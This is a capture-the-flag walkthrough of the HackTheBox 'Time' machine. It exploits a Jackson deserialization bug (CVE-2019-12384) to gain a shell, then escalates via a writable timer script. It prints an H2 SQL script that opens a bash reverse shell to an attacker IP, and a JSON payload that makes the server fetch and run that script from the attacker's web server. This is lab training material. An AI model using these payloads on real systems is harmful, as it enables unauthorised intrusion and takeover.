## Time

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.214 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/11a04175-f769-48f2-ae43-33c7e7cf8533)

<br>

The website has a function to beautify JSON.

![websiteBeautify](https://github.com/b1d0ws/OSCP/assets/58514930/fd124fb9-ab69-4e2e-8212-7fa2347deffa)

<br>

And one to validate it. If you input some normal text you get this error:

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

![websiteValidate](https://github.com/b1d0ws/OSCP/assets/58514930/e10e7be0-ff64-458a-ad25-d3a1a28ceb94)

<br>

If you search for this error you find [this RCE exploit](https://github.com/jas502n/CVE-2019-12384) in github.

![searchingExploit](https://github.com/b1d0ws/OSCP/assets/58514930/88fc682d-1937-48d4-98b7-9183145f1c24)

<br>

Following the exploit, first you create the injection.sql file.

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.11/2222 0>&1')
```

Up a python server on the same directory and input this payload to get a reverse shell:

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.11:8000/inject.sql'"}]
```

![inputPayload](https://github.com/b1d0ws/OSCP/assets/58514930/2a2a68ef-7241-4bf9-9d57-254f377013a8)

![gettingReverse](https://github.com/b1d0ws/OSCP/assets/58514930/091fd020-3382-4548-867a-2709faf1f494)

### Root Flag

LinPeas return that /usr/bin/timer_backup.sh is owned by our user.

![linPeas](https://github.com/b1d0ws/OSCP/assets/58514930/889a1e66-035c-4a75-8eb1-96ccefcdaef0)

<br>

Looking at linux services, we discover this script is related to some timer.

![services](https://github.com/b1d0ws/OSCP/assets/58514930/e5a39af0-1258-4445-b9d4-2324f7f21cf1)

<br>

Just edit the script to put a SUID bit on /bin/bash and get root user.

![gettingRoot](https://github.com/b1d0ws/OSCP/assets/58514930/20dab68b-3342-4b40-9fa5-13da4d71fd80)
